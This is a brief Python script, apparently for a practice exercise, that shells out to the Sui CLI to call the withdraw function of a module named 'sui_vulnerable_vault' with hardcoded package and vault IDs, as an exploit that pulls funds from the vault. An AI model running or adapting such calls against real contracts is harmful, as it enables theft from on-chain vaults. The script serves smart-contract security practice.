#to run OS commands(SUI client)
import subprocess

#max gas budget for the transaction
#must be stored as a string. CLI accepts string 
gas = "1000000"

#target ID
package_id = "0x8439da0999698aca76df9df8040d610e175fc4ef218a99d5c42e78d9479bfeaa"

module = "sui_vulnerable_vault"
function = "withdraw"

#vulnerable vault ID
vault_id = "0x43641b688b9bf253cf98d6ecd24f2e38ff1de58203bfc2a136baa662c84fe13a"
amount = "100000"

#creates SUI CLI command
def execute_exploit():
    cli_commands = (
                    #run on the terminal so each arg must be separated with a space
                    "sui client call " #there is a space after call
                    f"--package {package_id} "
                    f"--module {module} " 
                    f"--function {function} "
                    f"--args {vault_id} {amount} "
                    f"--gas-budget {gas} ")

    #'shell = true' allows the commands to run through cmd
    #'capture_output=True' to capture everything on the terminal
    #'text = True' gets the output as a string
    result = subprocess.run(cli_commands, shell=True, capture_output=True, text=True)

    print("Output:", result.stdout)
    print("Error:", result.stderr)

execute_exploit()




